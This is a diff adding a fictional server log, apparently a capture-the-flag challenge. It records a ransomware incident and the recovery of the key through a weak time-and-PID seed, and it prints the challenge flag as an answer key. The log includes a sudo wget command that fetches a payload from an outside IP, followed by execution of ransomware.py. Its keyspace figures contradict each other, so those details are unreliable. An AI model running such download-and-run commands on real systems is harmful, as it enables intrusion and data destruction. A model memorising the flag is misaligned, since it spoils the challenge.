@@ -1,0 +1,343 @@
+=== SecureCorp System Logs ===
+Date: 2025-11-15
+System: Ubuntu Server 22.04.3 LTS
+Hostname: secure-prod-01
+Timezone: UTC
+
+=== Boot Sequence ===
+00:00:01 [KERNEL] Linux version 5.15.0-88-generic (buildd@lcy02-amd64-051)
+00:00:01 [KERNEL] Command line: BOOT_IMAGE=/boot/vmlinuz-5.15.0-88-generic root=UUID=a3f7b2c8-d1e4-f5a6-b7c8-d9e0f1a2b3c4 ro quiet splash
+00:00:02 [KERNEL] DMI: Dell Inc. PowerEdge R740/0WCJNT, BIOS 2.15.1 03/15/2023
+00:00:02 [KERNEL] Memory: 65536MB available
+00:00:03 [SYSTEMD] systemd 249.11-0ubuntu3.11 running in system mode
+00:00:04 [SYSTEMD] Detected virtualization none
+00:00:04 [SYSTEMD] Detected architecture x86-64
+00:00:05 [SYSTEMD] Set hostname to <secure-prod-01>
+00:00:06 [NETWORK] eth0: Link is Up - 1Gbps/Full - flow control rx/tx
+00:00:07 [NETWORK] IPv4 address 192.168.100.149/24 assigned to eth0
+00:00:08 [SSHD] Server listening on 0.0.0.0 port 22
+00:00:09 [CRON] (CRON) INFO (pidfile fd = 3)
+00:00:10 [SYSTEMD] Reached target Multi-User System
+
+=== Normal Operations (00:10 - 03:30) ===
+00:15:23 [AUTH] pam_unix(sudo:session): session opened for user admin by (uid=0)
+00:15:24 [SUDO] admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+00:15:45 [APT] Reading package lists...
+00:15:47 [APT] Building dependency tree...
+00:15:48 [APT] All packages are up to date
+00:16:02 [AUTH] pam_unix(sudo:session): session closed for user admin
+00:30:01 [CRON] (admin) CMD (/usr/local/bin/backup_daily.sh)
+00:30:15 [BACKUP] Starting daily backup routine
+00:30:16 [BACKUP] Backing up /var/www/html
+00:30:45 [BACKUP] Backing up /etc
+00:31:12 [BACKUP] Backing up /home
+00:35:28 [BACKUP] Backup completed successfully to /mnt/backups/2025-11-15_0030.tar.gz
+01:00:01 [CRON] (root) CMD (/usr/local/bin/security_scan.sh)
+01:00:15 [SECURITY] Running integrity check
+01:00:16 [SECURITY] Checking system binaries
+01:00:45 [SECURITY] Scanning for suspicious processes
+01:01:23 [SECURITY] Analyzing network connections
+01:02:05 [SECURITY] All checks passed - system clean
+01:15:33 [SSHD] Accepted publickey for admin from 192.168.100.10 port 52431 ssh2
+01:15:35 [AUTH] pam_unix(sshd:session): session opened for user admin by (uid=0)
+01:16:12 [SUDO] admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+01:20:45 [AUTH] pam_unix(sshd:session): session closed for user admin
+01:30:01 [CRON] (www-data) CMD (/usr/local/bin/webapp_cleanup.sh)
+01:30:15 [WEBAPP] Cleaning temporary files
+01:30:23 [WEBAPP] Removed 127 temporary files (3.2MB freed)
+02:00:01 [CRON] (root) CMD (/usr/local/bin/log_rotate.sh)
+02:00:15 [LOGROTATE] Rotating system logs
+02:00:23 [LOGROTATE] Compressed /var/log/syslog.1
+02:00:45 [LOGROTATE] Compressed /var/log/auth.log.1
+02:01:12 [LOGROTATE] Log rotation completed
+02:15:47 [KERNEL] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.
+02:15:48 [KERNEL] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.
+02:16:01 [NGINX] 192.168.100.25 - - [15/Nov/2025:02:16:01 +0000] "GET / HTTP/1.1" 200 4523
+02:16:03 [NGINX] 192.168.100.37 - - [15/Nov/2025:02:16:03 +0000] "GET /api/status HTTP/1.1" 200 156
+02:30:01 [CRON] (admin) CMD (/usr/local/bin/db_maintenance.sh)
+02:30:15 [DATABASE] Running database optimization
+02:30:23 [DATABASE] Analyzing table: users
+02:30:45 [DATABASE] Analyzing table: sessions
+02:31:12 [DATABASE] Analyzing table: audit_log
+02:32:34 [DATABASE] Optimization completed
+03:00:01 [CRON] (root) CMD (/usr/local/bin/health_check.sh)
+03:00:15 [HEALTH] CPU usage: 12%
+03:00:16 [HEALTH] Memory usage: 23% (15GB/65GB)
+03:00:17 [HEALTH] Disk usage: 45% (450GB/1TB)
+03:00:18 [HEALTH] Network throughput: 125Mbps
+03:00:19 [HEALTH] All systems nominal
+03:15:22 [SSHD] Accepted publickey for dbadmin from 192.168.100.15 port 44521 ssh2
+03:15:23 [AUTH] pam_unix(sshd:session): session opened for user dbadmin by (uid=0)
+03:16:45 [SUDO] dbadmin : TTY=pts/2 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+03:17:23 [AUTH] pam_unix(sshd:session): session closed for user dbadmin
+
+=== Pre-Attack Activity (03:30 - 03:38) ===
+03:30:01 [CRON] (admin) CMD (/usr/local/bin/file_integrity.sh)
+03:30:15 [INTEGRITY] Scanning /home/user/documents
+03:30:16 [INTEGRITY] Checking file: /home/user/documents/quarterly_report.pdf
+03:30:17 [INTEGRITY] Checking file: /home/user/documents/budget_2025.xlsx
+03:30:18 [INTEGRITY] Checking file: /home/user/documents/employee_data.csv
+03:30:19 [INTEGRITY] All files verified - no changes detected
+03:31:45 [SSHD] Failed password for invalid user scanner from 103.45.67.89 port 38291 ssh2
+03:31:46 [SSHD] Failed password for invalid user scanner from 103.45.67.89 port 38291 ssh2
+03:31:47 [SSHD] Connection closed by invalid user scanner 103.45.67.89 port 38291 [preauth]
+03:32:01 [FIREWALL] Blocked incoming connection from 103.45.67.89 (rate limit exceeded)
+03:33:12 [NGINX] 192.168.100.42 - - [15/Nov/2025:03:33:12 +0000] "POST /api/login HTTP/1.1" 200 234
+03:33:15 [AUTH] pam_unix(login:session): session opened for user admin by LOGIN(uid=0)
+03:34:23 [PROCESS] admin started process: vim /home/admin/notes.txt (PID: 14523)
+03:35:45 [PROCESS] Process terminated: vim (PID: 14523, exit code: 0)
+03:36:12 [SSHD] Accepted publickey for admin from 192.168.100.10 port 55123 ssh2
+03:36:13 [AUTH] pam_unix(sshd:session): session opened for user admin by (uid=0)
+03:37:01 [SUDO] admin : TTY=pts/3 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/ps aux
+03:37:23 [PROCESS] admin started process: python3 /opt/scripts/system_monitor.py (PID: 14892)
+03:38:15 [MONITOR] System resources within normal parameters
+03:38:45 [PROCESS] Process terminated: python3 (PID: 14892, exit code: 0)
+
+=== RANSOMWARE ATTACK BEGINS (03:39:00) ===
+03:39:00 [NETWORK] Incoming connection from 185.220.101.47 port 6667
+03:39:01 [FIREWALL] Allowed connection from 185.220.101.47 (whitelisted IP range)
+03:39:02 [SSHD] Accepted password for admin from 185.220.101.47 port 6667 ssh2
+03:39:03 [AUTH] pam_unix(sshd:session): session opened for user admin by (uid=0)
+03:39:04 [WARNING] Unusual login time detected for user admin (outside normal hours)
+03:39:05 [SUDO] admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.47/payload.tar.gz
+03:39:06 [NETWORK] Downloading file from 185.220.101.47
+03:39:07 [NETWORK] Downloaded 2.3MB in 1.2 seconds
+03:39:08 [PROCESS] admin started process: tar -xzf payload.tar.gz (PID: 15234)
+03:39:09 [FILESYSTEM] Extracted files to /tmp/payload/
+03:39:10 [PROCESS] Process terminated: tar (PID: 15234, exit code: 0)
+03:39:11 [SUDO] admin : TTY=pts/4 ; PWD=/tmp/payload ; USER=root ; COMMAND=/usr/bin/chmod +x ransomware.py
+03:39:12 [FILESYSTEM] File permissions changed: /tmp/payload/ransomware.py (mode: 0755)
+03:39:13 [WARNING] Executable file created in /tmp directory
+03:39:14 [PROCESS] admin started process: python3 /tmp/payload/ransomware.py (PID: 15847)
+03:39:15 [INFO] Process started: ransomware.py (PID: 15847)(Timestamp: 1731644355)
+03:39:15 [WARNING] Process 15847 accessing multiple files rapidly
+03:39:16 [FILESYSTEM] File opened: /home/user/documents/document.txt (PID: 15847)
+03:39:16 [FILESYSTEM] File read: /home/user/documents/document.txt (512 bytes)
+03:39:16 [FILESYSTEM] File created: /home/user/documents/document.txt.enc
+03:39:16 [FILESYSTEM] File written: /home/user/documents/document.txt.enc (512 bytes)
+03:39:16 [FILESYSTEM] File deleted: /home/user/documents/document.txt
+03:39:16 [ALERT] Suspicious file activity: document.txt deleted after .enc creation
+03:39:16 [FILESYSTEM] File opened: /home/user/documents/flag.txt (PID: 15847)
+03:39:16 [FILESYSTEM] File read: /home/user/documents/flag.txt (45 bytes)
+03:39:16 [FILESYSTEM] File created: /home/user/documents/flag.txt.enc
+03:39:16 [FILESYSTEM] File written: /home/user/documents/flag.txt.enc (48 bytes)
+03:39:16 [FILESYSTEM] File deleted: /home/user/documents/flag.txt
+03:39:16 [ALERT] Suspicious file activity: flag.txt deleted after .enc creation
+03:39:17 [FILESYSTEM] File opened: /home/user/documents/data.txt (PID: 15847)
+03:39:17 [FILESYSTEM] File read: /home/user/documents/data.txt (2048 bytes)
+03:39:17 [FILESYSTEM] File created: /home/user/documents/data.txt.enc
+03:39:17 [FILESYSTEM] File written: /home/user/documents/data.txt.enc (2048 bytes)
+03:39:17 [FILESYSTEM] File deleted: /home/user/documents/data.txt
+03:39:17 [CRITICAL] Multiple files encrypted and deleted in rapid succession
+03:39:17 [FILESYSTEM] File created: /home/user/documents/README_RANSOM.txt
+03:39:17 [FILESYSTEM] File written: /home/user/documents/README_RANSOM.txt (1024 bytes)
+03:39:18 [INFO] Process terminated: ransomware.py (PID: 15847)
+03:39:18 [CRITICAL] Potential ransomware activity detected
+03:39:19 [ALERT] Unusual file access pattern detected in /home/user/documents
+03:39:20 [SECURITY] 3 files with .enc extension created in 5 seconds
+03:39:21 [SECURITY] Original files deleted after encryption
+03:39:22 [SECURITY] Ransom note detected: README_RANSOM.txt
+03:39:23 [ALERT] RANSOMWARE DETECTED - Initiating incident response
+
+=== Post-Attack Response (03:39:23 - 03:42:00) ===
+03:39:24 [INCIDENT] Incident #IR-2025-1115-001 created
+03:39:25 [INCIDENT] Severity: CRITICAL
+03:39:26 [INCIDENT] Type: Ransomware Attack
+03:39:27 [INCIDENT] Affected user: admin
+03:39:28 [INCIDENT] Affected system: /home/user/documents
+03:39:29 [SECURITY] Isolating compromised session (PID: 15234-15847)
+03:39:30 [NETWORK] Blocking outbound connections from 192.168.100.149
+03:39:31 [FIREWALL] Emergency rule applied: DENY ALL from 192.168.100.149
+03:39:32 [SSHD] Forcing disconnect of admin session from 185.220.101.47
+03:39:33 [AUTH] pam_unix(sshd:session): session closed for user admin (forced)
+03:39:34 [NETWORK] Connection terminated: 185.220.101.47 port 6667
+03:39:35 [SECURITY] User admin account suspended pending investigation
+03:39:36 [ALERT] Email sent to security@securecorp.local
+03:39:37 [ALERT] SMS sent to on-call engineer: +1-555-0123
+03:39:38 [BACKUP] Emergency snapshot initiated for /home/user/documents
+03:39:39 [BACKUP] Snapshot created: /mnt/recovery/emergency_2025-11-15_033939.snap
+03:39:40 [FORENSICS] Memory dump captured from PID 15847
+03:39:41 [FORENSICS] Process tree captured
+03:39:42 [FORENSICS] Network connections logged
+03:39:43 [FORENSICS] File access log preserved
+03:39:44 [FILESYSTEM] Write-protection enabled for /home/user/documents
+03:39:45 [SECURITY] Scanning for additional malware
+03:39:46 [ANTIVIRUS] Full system scan initiated
+03:39:47 [ANTIVIRUS] Scanning /tmp/payload/
+03:39:48 [ANTIVIRUS] Detected: Trojan.Ransom.Python (ransomware.py)
+03:39:49 [ANTIVIRUS] Quarantined: /tmp/payload/ransomware.py
+03:39:50 [ANTIVIRUS] Scanning /home/user/documents
+03:39:51 [ANTIVIRUS] Detected: Ransom note (README_RANSOM.txt)
+03:39:52 [FILESYSTEM] Preserved for analysis: README_RANSOM.txt
+03:40:01 [INCIDENT] Security team notified
+03:40:02 [INCIDENT] Response team assembled
+03:40:03 [INCIDENT] Forensic analysis in progress
+03:40:15 [FORENSICS] Analyzing encryption artifacts
+03:40:16 [FORENSICS] Examining file: document.txt.enc
+03:40:17 [FORENSICS] File header: Random bytes (no signature)
+03:40:18 [FORENSICS] Examining file: flag.txt.enc
+03:40:19 [FORENSICS] File size: Original 45 bytes → Encrypted 48 bytes
+03:40:20 [FORENSICS] Padding detected: PKCS#7 padding present
+03:40:21 [FORENSICS] Examining file: data.txt.enc
+03:40:22 [FORENSICS] Encryption method: Likely stream cipher or CBC mode
+03:40:30 [FORENSICS] Analyzing ransomware.py source code
+03:40:31 [FORENSICS] Language: Python 3.x
+03:40:32 [FORENSICS] Imports detected: os, random, time, Crypto.Cipher.ChaCha20
+03:40:33 [FORENSICS] Cipher identified: ChaCha20 stream cipher
+03:40:34 [FORENSICS] Key generation function found
+03:40:35 [FORENSICS] VULNERABILITY: Uses time.time() for PRNG seed
+03:40:36 [FORENSICS] VULNERABILITY: Combines timestamp and PID for seed
+03:40:37 [FORENSICS] Seed formula: (timestamp * 1000) + (PID % 1000)
+03:40:38 [FORENSICS] Attack timestamp: 1731644355 (2025-11-15 03:39:15 UTC)
+03:40:39 [FORENSICS] Attack PID: 15847
+03:40:40 [FORENSICS] Calculated seed: 1731644355847
+03:40:41 [ANALYSIS] Weak PRNG detected - key recovery may be possible
+03:40:42 [ANALYSIS] Timestamp known from logs
+03:40:43 [ANALYSIS] PID known from process table
+03:40:44 [ANALYSIS] Keyspace: Limited to timestamp range × PID range
+03:40:45 [ANALYSIS] Estimated keyspace: ~120,000 possible keys
+03:40:46 [ANALYSIS] Brute force attack feasible
+03:40:50 [INCIDENT] Decryption strategy identified
+03:40:51 [INCIDENT] No ransom payment required
+03:40:52 [INCIDENT] Key recovery attack in progress
+03:41:00 [RECOVERY] Testing key generation with logged parameters
+03:41:01 [RECOVERY] Timestamp: 1731644355
+03:41:02 [RECOVERY] PID: 15847
+03:41:03 [RECOVERY] Seed: 1731644355847
+03:41:04 [RECOVERY] Generating test key...
+03:41:05 [RECOVERY] Key generated (32 bytes)
+03:41:06 [RECOVERY] Testing decryption on flag.txt.enc
+03:41:07 [RECOVERY] Decryption attempt 1: Failed (invalid plaintext)
+03:41:08 [RECOVERY] Adjusting timestamp offset: -1 second
+03:41:09 [RECOVERY] Testing timestamp: 1731644354
+03:41:10 [RECOVERY] Decryption attempt 2: Failed
+03:41:11 [RECOVERY] Adjusting timestamp offset: +1 second
+03:41:12 [RECOVERY] Testing timestamp: 1731644356
+03:41:13 [RECOVERY] Decryption attempt 3: Failed
+03:41:14 [RECOVERY] Using exact logged timestamp: 1731644355
+03:41:15 [RECOVERY] SUCCESS: File decrypted successfully
+03:41:16 [RECOVERY] Decrypted content: "HASHX{w34k_prng_br34ks_r4ns0mw4r3_k3ys}"
+03:41:17 [RECOVERY] Flag recovered!
+03:41:20 [RECOVERY] Decrypting remaining files...
+03:41:21 [RECOVERY] Decrypted: document.txt (512 bytes)
+03:41:22 [RECOVERY] Decrypted: data.txt (2048 bytes)
+03:41:23 [RECOVERY] All files successfully recovered
+03:41:30 [INCIDENT] Files restored from encryption
+03:41:31 [INCIDENT] Zero data loss confirmed
+03:41:32 [INCIDENT] No ransom paid
+03:41:33 [INCIDENT] Incident contained and resolved
+03:41:40 [CLEANUP] Removing encrypted files
+03:41:41 [CLEANUP] Deleted: document.txt.enc
+03:41:42 [CLEANUP] Deleted: flag.txt.enc
+03:41:43 [CLEANUP] Deleted: data.txt.enc
+03:41:44 [CLEANUP] Preserved: README_RANSOM.txt (evidence)
+03:41:45 [CLEANUP] Removing malware artifacts
+03:41:46 [CLEANUP] Deleted: /tmp/payload/ (quarantined)
+03:41:50 [SECURITY] Resetting admin account credentials
+03:41:51 [SECURITY] Forcing password reset for admin
+03:41:52 [SECURITY] Enabling 2FA for admin account
+03:41:53 [SECURITY] Reviewing access logs for additional compromises
+03:41:54 [SECURITY] No additional suspicious activity detected
+03:42:00 [INCIDENT] Incident #IR-2025-1115-001 resolved
+
+=== Post-Incident Analysis (03:42 - 04:00) ===
+03:42:15 [REPORT] Incident Report Generated
+03:42:16 [REPORT] Attack vector: Compromised credentials
+03:42:17 [REPORT] Entry point: SSH from 185.220.101.47
+03:42:18 [REPORT] Malware type: Custom Python ransomware
+03:42:19 [REPORT] Encryption: ChaCha20 with weak PRNG
+03:42:20 [REPORT] Files affected: 3 files in /home/user/documents
+03:42:21 [REPORT] Recovery method: Cryptographic key recovery
+03:42:22 [REPORT] Downtime: 3 minutes
+03:42:23 [REPORT] Data loss: None
+03:42:24 [REPORT] Financial impact: $0 (no ransom paid)
+03:42:30 [RECOMMENDATIONS] Implement IP whitelist for SSH
+03:42:31 [RECOMMENDATIONS] Deploy intrusion detection system (IDS)
+03:42:32 [RECOMMENDATIONS] Enable file integrity monitoring
+03:42:33 [RECOMMENDATIONS] Restrict /tmp execution permissions
+03:42:34 [RECOMMENDATIONS] Implement application whitelisting
+03:42:35 [RECOMMENDATIONS] Enhanced logging for file operations
+03:42:36 [RECOMMENDATIONS] Security awareness training for staff
+03:42:40 [NETWORK] Firewall rules updated
+03:42:41 [NETWORK] Blocked: 185.220.101.0/24
+03:42:42 [NETWORK] Added to threat intelligence feed
+03:42:43 [SECURITY] User admin account re-enabled
+03:42:44 [AUTH] Forced password change completed for admin
+03:42:45 [AUTH] 2FA enrollment completed for admin
+03:42:50 [MONITORING] Enhanced monitoring enabled
+03:42:51 [MONITORING] File access auditing activated
+03:42:52 [MONITORING] Process execution logging enabled
+03:42:53 [MONITORING] Network connection tracking activated
+03:43:00 [BACKUP] Regular backup schedule resumed
+03:43:01 [BACKUP] Verifying backup integrity
+03:43:02 [BACKUP] All backups verified and intact
+03:45:00 [SSHD] Accepted publickey for admin from 192.168.100.10 port 56789 ssh2
+03:45:01 [AUTH] pam_unix(sshd:session): session opened for user admin by (uid=0)
+03:45:02 [AUDIT] User admin login monitored (post-incident)
+03:45:15 [SUDO] admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status security-monitor
+03:46:00 [AUTH] pam_unix(sshd:session): session closed for user admin
+03:50:01 [SECURITY] Routine security scan
+03:50:15 [SECURITY] System integrity check: PASSED
+03:50:23 [SECURITY] Process audit: PASSED
+03:50:34 [SECURITY] Network connections: NORMAL
+03:50:45 [SECURITY] File permissions: VERIFIED
+03:51:00 [SECURITY] All security checks passed
+04:00:01 [CRON] (root) CMD (/usr/local/bin/hourly_health.sh)
+04:00:15 [HEALTH] Post-incident system status: HEALTHY
+04:00:16 [HEALTH] All services operational
+04:00:17 [HEALTH] Security posture: ENHANCED
+
+=== System Information (Detailed) ===
+System: secure-prod-01
+OS: Ubuntu Server 22.04.3 LTS (Jammy Jellyfish)
+Kernel: 5.15.0-88-generic
+Architecture: x86_64
+Processor: Intel(R) Xeon(R) Gold 6230 CPU @ 2.10GHz (40 cores)
+Memory: 65536 MB DDR4 ECC
+Storage: 1TB SSD RAID-10
+Network: 1Gbps Ethernet
+
+Attack Summary:
+- Attack Time: 2025-11-15 03:39:15 UTC
+- Unix Timestamp: 1731644355
+- Attack Duration: ~3 seconds (file encryption)
+- Response Time: ~3 minutes (detection to resolution)
+- Process ID: 15847
+- Malware: ransomware.py
+- Encryption: ChaCha20
+- Seed: 1731644355847
+- Key: Derived from (timestamp * 1000) + (PID % 1000)
+
+Files Affected:
+1. /home/user/documents/document.txt → document.txt.enc (recovered)
+2. /home/user/documents/flag.txt → flag.txt.enc (recovered)
+3. /home/user/documents/data.txt → data.txt.enc (recovered)
+
+Recovery Details:
+- Method: Cryptographic key recovery via weak PRNG exploitation
+- Timestamp Source: System logs (/var/log/syslog, process table)
+- PID Source: Process table, system logs
+- Keyspace: ~120 keys (timestamp ±60s, PID mod 1000)
+- Recovery Time: < 1 minute
+- Success Rate: 100%
+- Data Loss: 0 bytes
+
+Security Improvements Implemented:
+- IP-based access control
+- Enhanced file monitoring
+- Process execution auditing  
+- 2FA enforcement
+- Threat intelligence integration
+
+Lessons Learned:
+1. Weak PRNG (time.time() + PID) is cryptographically broken
+2. Proper key generation requires cryptographically secure random sources
+3. System logs can leak sufficient information for key recovery
+4. Rapid incident response prevented data loss
+5. No need to pay ransom when cryptography is weak
+
+Flag Recovered: HASHX{w34k_prng_br34ks_r4ns0mw4r3_k3ys}
+
+=== End of Critical Incident Log ===
+=== System Restored to Normal Operations ===
+=== Monitoring Continues ===
